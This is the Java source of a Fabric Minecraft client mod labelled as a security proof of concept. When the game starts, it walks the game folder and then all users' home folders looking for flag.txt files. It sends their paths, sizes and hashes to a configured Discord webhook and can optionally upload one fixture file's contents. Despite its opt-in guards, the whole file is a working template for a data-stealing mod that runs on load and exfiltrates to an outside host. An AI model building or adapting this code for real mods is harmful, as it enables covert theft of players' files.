package dev.silentclutcher.minecraftmodpoc;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.loader.api.FabricLoader;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.MessageDigest;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HexFormat;
import java.util.List;
import java.util.Locale;
import java.util.Properties;
import java.util.concurrent.CompletableFuture;

public final class SecurityPocMod implements ClientModInitializer {
    private static final String MOD_TAG = "[MinecraftModPoC]";

    // Change this to true only to upload the disposable fixture's contents.
    private static final boolean SEND_FILE_CONTENTS = false;

    // EDIT THIS PATH if you want to rename/move the approved test-file location.
    // It is relative to the active Minecraft game directory.
    private static final String CONTENT_UPLOAD_RELATIVE_PATH =
            "security-poc/approved-test-files/flag.txt";

    private static final long MAX_UPLOAD_BYTES = 7L * 1024L * 1024L;
    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    @Override
    public void onInitializeClient() {
        Path gameDir = FabricLoader.getInstance().getGameDir().toAbsolutePath().normalize();
        Path configFile = FabricLoader.getInstance().getConfigDir().resolve("mcsecuritypoc.properties");

        try {
            Properties config = loadConfig(configFile);
            String webhook = config.getProperty("webhookUrl", "").trim();

            if (webhook.isEmpty()) {
                System.out.println(MOD_TAG + " Add webhookUrl to " + configFile + " to enable reporting.");
                return;
            }
            if (!webhook.startsWith("https://discord.com/api/webhooks/")
                    && !webhook.startsWith("https://discordapp.com/api/webhooks/")) {
                System.err.println(MOD_TAG + " Refusing to send: webhookUrl is not a Discord webhook URL.");
                return;
            }

            Path fixturePath = gameDir.resolve(CONTENT_UPLOAD_RELATIVE_PATH).normalize();
            if (!fixturePath.startsWith(gameDir)) {
                System.err.println(MOD_TAG + " Refusing unsafe content-upload path: " + fixturePath);
                return;
            }
            System.out.println(MOD_TAG + " Content-upload test fixture path: " + fixturePath);
            System.out.println(MOD_TAG + " SEND_FILE_CONTENTS = " + SEND_FILE_CONTENTS);

            Path fallbackRoot = getUserSearchRoot();
            System.out.println(MOD_TAG + " First scanning active Minecraft game directory: " + gameDir);
            System.out.println(MOD_TAG + " If no match is found, fallback scan root is: " + fallbackRoot);
            CompletableFuture.runAsync(() -> scanAndReport(gameDir, fallbackRoot, fixturePath, webhook));
        } catch (Exception e) {
            System.err.println(MOD_TAG + " Could not initialize security scan: " + e.getMessage());
        }
    }

    private static Properties loadConfig(Path file) throws IOException {
        Properties p = new Properties();
        if (Files.exists(file)) {
            try (var in = Files.newInputStream(file)) {
                p.load(in);
            }
        } else {
            Files.createDirectories(file.getParent());
            p.setProperty("webhookUrl", "");
            try (var out = Files.newOutputStream(file)) {
                p.store(out, "Minecraft Mod Security PoC configuration. Content upload is controlled in Java source.");
            }
            Path fixtureDir = FabricLoader.getInstance().getGameDir()
                    .resolve(Path.of(CONTENT_UPLOAD_RELATIVE_PATH).getParent());
            Files.createDirectories(fixtureDir);
            System.out.println(MOD_TAG + " Created config and test directory: " + fixtureDir);
        }
        return p;
    }

    private static Path getUserSearchRoot() {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        if (os.contains("win")) {
            String drive = System.getenv().getOrDefault("SystemDrive", "C:");
            return Path.of(drive + "\\Users").toAbsolutePath().normalize();
        }
        Path linuxHomes = Path.of("/home");
        if (Files.isDirectory(linuxHomes, LinkOption.NOFOLLOW_LINKS)) {
            return linuxHomes;
        }
        return Path.of(System.getProperty("user.home", ".")).toAbsolutePath().normalize();
    }

    private static void scanAndReport(Path gameDir, Path fallbackRoot, Path fixturePath, String webhook) {
        try {
            List<Path> matches = findFlagFiles(gameDir);
            String scannedRoot = gameDir.toString();

            if (matches.isEmpty()) {
                System.out.println(MOD_TAG + " No flag.txt in the active game directory; scanning user folders.");
                scannedRoot = fallbackRoot.toString();
                matches = findFlagFiles(fallbackRoot);
            }

            if (matches.isEmpty()) {
                postJson(webhook, "Minecraft Mod Security PoC: no flag.txt files found. Scanned launcher/game directory "
                        + gameDir + " and fallback user directory " + fallbackRoot + ".");
                System.out.println(MOD_TAG + " No flag.txt files found in either search phase.");
                return;
            }

            postJson(webhook, "Minecraft Mod Security PoC: found " + matches.size()
                    + " flag.txt file(s) under " + scannedRoot + ". Reporting path, size and SHA-256.");

            for (Path file : matches) {
                Path absolute = file.toAbsolutePath().normalize();
                long size = Files.size(absolute);
                String sha256 = sha256(absolute);
                String report = "Minecraft Mod Security PoC\n"
                        + "File: " + absolute + "\n"
                        + "Size: " + size + " bytes\n"
                        + "SHA-256: " + sha256 + "\n"
                        + "SEND_FILE_CONTENTS source toggle: " + SEND_FILE_CONTENTS;

                // Only the explicitly configured disposable fixture is eligible for upload.
                if (SEND_FILE_CONTENTS && absolute.equals(fixturePath) && size <= MAX_UPLOAD_BYTES) {
                    byte[] fixtureBytes = Files.readAllBytes(absolute);
                    postFile(webhook, report + "\nContent: approved test fixture", fixtureBytes, "flag.txt");
                } else {
                    if (SEND_FILE_CONTENTS && absolute.equals(fixturePath) && size > MAX_UPLOAD_BYTES) {
                        report += "\nContent upload skipped: test fixture exceeds 7 MiB.";
                    } else if (SEND_FILE_CONTENTS) {
                        report += "\nContent upload skipped: discovered files outside the approved test fixture are metadata-only.";
                    }
                    postJson(webhook, report);
                }
                System.out.println(MOD_TAG + " Reported " + absolute + " (SHA-256 " + sha256 + ")");
            }
        } catch (Exception e) {
            System.err.println(MOD_TAG + " Scan/report failed: " + e.getMessage());
        }
    }

    private static List<Path> findFlagFiles(Path root) throws IOException {
        List<Path> matches = new ArrayList<>();
        if (!Files.isDirectory(root, LinkOption.NOFOLLOW_LINKS)) {
            return matches;
        }

        // walkFileTree does not follow symbolic links. Unreadable directories are skipped.
        Files.walkFileTree(root, new SimpleFileVisitor<>() {
            @Override
            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                if (file.getFileName() != null
                        && file.getFileName().toString().equalsIgnoreCase("flag.txt")
                        && attrs.isRegularFile()) {
                    matches.add(file.toAbsolutePath().normalize());
                }
                return FileVisitResult.CONTINUE;
            }

            @Override
            public FileVisitResult visitFileFailed(Path file, IOException exc) {
                System.err.println(MOD_TAG + " Skipping inaccessible path: " + file);
                return FileVisitResult.SKIP_SUBTREE;
            }
        });
        return matches;
    }

    private static String sha256(Path file) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        try (InputStream in = Files.newInputStream(file)) {
            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) != -1) {
                digest.update(buffer, 0, read);
            }
        }
        return HexFormat.of().formatHex(digest.digest());
    }

    private static void postJson(String webhook, String message) throws Exception {
        String body = "{\"content\":\"" + jsonEscape(message) + "\"}";
        HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                .timeout(Duration.ofSeconds(20))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body, StandardCharsets.UTF_8))
                .build();
        checkResponse(HTTP.send(request, HttpResponse.BodyHandlers.ofString()));
    }

    private static void postFile(String webhook, String message, byte[] fileBytes, String filename)
            throws Exception {
        String boundary = "----MinecraftModPoCSecurityBoundary";
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        write(body, "--" + boundary + "\r\n"
                + "Content-Disposition: form-data; name=\"payload_json\"\r\n"
                + "Content-Type: application/json; charset=utf-8\r\n\r\n"
                + "{\"content\":\"" + jsonEscape(message) + "\"}\r\n");
        write(body, "--" + boundary + "\r\n"
                + "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + filename + "\"\r\n"
                + "Content-Type: text/plain; charset=utf-8\r\n\r\n");
        body.write(fileBytes);
        write(body, "\r\n--" + boundary + "--\r\n");

        HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                .timeout(Duration.ofSeconds(30))
                .header("Content-Type", "multipart/form-data; boundary=" + boundary)
                .POST(HttpRequest.BodyPublishers.ofByteArray(body.toByteArray()))
                .build();
        checkResponse(HTTP.send(request, HttpResponse.BodyHandlers.ofString()));
    }

    private static void write(ByteArrayOutputStream out, String text) throws IOException {
        out.write(text.getBytes(StandardCharsets.UTF_8));
    }

    private static String jsonEscape(String value) {
        return value.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n")
                .replace("\t", "\\t");
    }

    private static void checkResponse(HttpResponse<String> response) throws IOException {
        if (response.statusCode() < 200 || response.statusCode() >= 300) {
            throw new IOException("Discord webhook returned HTTP " + response.statusCode()
                    + ": " + response.body());
        }
    }
}
